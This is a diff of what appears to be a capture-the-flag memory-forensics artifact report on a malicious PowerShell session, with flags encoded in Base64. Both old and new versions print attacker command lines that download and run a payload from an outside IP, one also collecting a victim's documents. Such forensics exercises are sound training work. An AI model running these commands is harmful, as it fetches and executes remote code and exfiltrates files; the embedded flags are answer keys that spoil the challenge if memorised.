@@ -1,22 +1,22 @@
-POWERSHELL COMMAND ANALYSIS
-===========================
-Decoded Base64 command from memory strings:
-
-ORIGINAL (Base64):
-JABmAGwAYQBnAD0AJwBDAFQARgB7AG0AZQBtAF8AZgBvAHIAZQBuAHMAaQBjAHMAXwByAGUAdgBlAGEAbABzAF8AYQBsAGwAfQAnAA==
-
-DECODED (UTF-16LE):
-$flag='CTF{mem_forensics_reveals_all}'
-
-ADDITIONAL POWERSHELL ARTIFACTS:
-- Execution policy bypass detected
-- Script block logging disabled
-- Anti-forensics techniques employed
-- Memory injection techniques used
+POWERSHELL FORENSICS
+===================
+Process ID: 2847
+Parent: explorer.exe (1484)
+Command Line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
 
 COMMAND HISTORY:
-Set-ExecutionPolicy Bypass -Scope Process
-Invoke-WebRequest -Uri "http://185.243.115.42/payload" -OutFile "C:\Windows\Temp\backup.exe"
-Start-Process "C:\Windows\Temp\backup.exe" -ArgumentList "/install /silent"
-$data = Get-Content "C:\Users\victim\Documents\*" -Raw
-[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
+[14:28:12] IEX (New-Object Net.WebClient).DownloadString('http://185.243.115.42/payload.ps1')
+[14:28:15] $data = 'Q1RGe21lbTByeV9mb3JlbnNpY3NfaDRja2VyX2YwdW5kfQ=='
+[14:28:16] [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data))
+[14:28:18] Start-Process notepad.exe
+[14:28:20] Add-Content -Path 'C:\Windows\Temp\log.txt' -Value $data
+[14:28:25] Remove-Item 'C:\Windows\Temp\payload.ps1' -Force
+
+MEMORY STRINGS:
+- Base64 encoded flag stored in variable
+- Downloaded malicious script from C2 server
+- Created temporary log file with encoded data
+- Attempted cleanup of downloaded payload
+
+KEY FINDING:
+Encoded flag found in PowerShell memory: Q1RGe21lbTByeV9mb3JlbnNpY3NfaDRja2VyX2YwdW5kfQ==
